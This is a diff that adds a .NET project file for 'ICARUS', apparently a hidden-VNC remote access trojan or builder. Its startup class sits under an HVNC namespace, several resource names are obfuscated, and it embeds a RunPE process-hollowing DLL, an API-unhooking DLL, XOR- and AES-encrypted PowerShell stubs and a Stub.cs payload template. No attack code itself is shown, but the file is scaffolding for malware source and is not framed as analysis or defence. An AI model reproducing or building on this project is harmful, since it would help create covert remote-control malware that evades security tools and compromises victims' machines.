@@ -1,0 +1,75 @@
+<Project Sdk="Microsoft.NET.Sdk.WindowsDesktop">
+  <PropertyGroup>
+    <AssemblyName>ICARUS 1.0.0.3</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <UseWindowsForms>True</UseWindowsForms>
+    <TargetFramework>net472</TargetFramework>
+    <Prefer32Bit>True</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>preview</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>app.ico</ApplicationIcon>
+    <RootNamespace>ICARUS</RootNamespace>
+    <StartupObject>ICARUS.HVNC.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|AnyCPU'">
+    <WarningLevel>0</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <None Remove="dkQR24YvWSEDekmRiH.jSbRHsuxn8LiyGXk1r" />
+    <None Remove="qT8DjKpvRcBQxlwUc2.1V2OLwGeIEb6lyLCOW" />
+    <Compile Remove="HVNC.Resources.Stub.cs" />
+    <Compile Remove="Resources\Stub.cs" />
+    <None Remove="HVNC.Resources.XORStub.ps1" />
+    <None Remove="HVNC.Resources.AESStub.ps1" />
+    <None Remove="HVNC.Resources.runpe.dll" />
+    <None Remove="Resources\AESStub.ps1" />
+    <None Remove="Resources\apiunhooker.dll" />
+    <None Remove="Resources\runpe.dll" />
+    <None Remove="Resources\XORStub.ps1" />
+    <None Remove="VBLVIN15y3Mx68Qe8m.bXwSjvHVAiEcZOFDwT" />
+    <None Remove="HVNC.Resources.apiunhooker.dll" />
+    <EmbeddedResource Include="dkQR24YvWSEDekmRiH.jSbRHsuxn8LiyGXk1r" />
+    <EmbeddedResource Include="qT8DjKpvRcBQxlwUc2.1V2OLwGeIEb6lyLCOW" />
+    <EmbeddedResource Include="Resources\AESStub.ps1" />
+    <EmbeddedResource Include="Resources\apiunhooker.dll" />
+    <EmbeddedResource Include="Resources\runpe.dll" />
+    <EmbeddedResource Include="Resources\Stub.cs" />
+    <EmbeddedResource Include="Resources\XORStub.ps1" />
+    <EmbeddedResource Include="VBLVIN15y3Mx68Qe8m.bXwSjvHVAiEcZOFDwT" />
+  </ItemGroup>
+  <ItemGroup>
+    <Reference Include="apiunhooker">
+      <HintPath>..\Dumps\apiunhooker.dll</HintPath>
+    </Reference>
+    <Reference Include="dnlib">
+      <HintPath>I:\F\Update\Update\dnlib.dll</HintPath>
+    </Reference>
+    <Reference Include="runpe">
+      <HintPath>..\Dumps\runpe.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Core" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Management" />
+    <Reference Include="IconExtractor">
+      <HintPath>..\Dumps\Dumps\IconExtractor.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Newtonsoft.Json">
+      <HintPath>I:\F\Update\Update\newtonsoft.json.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="PeNet">
+      <HintPath>..\PeNet.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Update="aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+  </ItemGroup>
+</Project>
